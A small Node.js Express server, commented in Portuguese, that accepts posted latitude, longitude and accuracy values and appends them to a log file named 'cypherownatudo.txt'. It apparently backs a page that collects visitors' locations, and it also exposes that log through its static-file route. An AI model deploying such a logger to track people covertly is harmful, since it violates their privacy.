const express = require('express');
const fs = require('fs');

const app = express();
const PORT = 3000;

app.use(express.static('.'));
app.use(express.json());

app.post('/salvar', (req, res) => {
  const dados = req.body;
  const log = `[${new Date().toISOString()}] Lat: ${dados.latitude}, Lon: ${dados.longitude}, Precisão: ${dados.accuracy}m\n`;

  fs.appendFile('cypherownatudo.txt', log, err => {
    if (err) {
      console.error('Erro ao salvar:', err);
      return res.status(500).send('Erro ao salvar');
    }
    res.send('Localização salva');
  });
});

app.listen(PORT, () => {
  console.log(`Servidor rodando em http://localhost:${PORT}`);
});
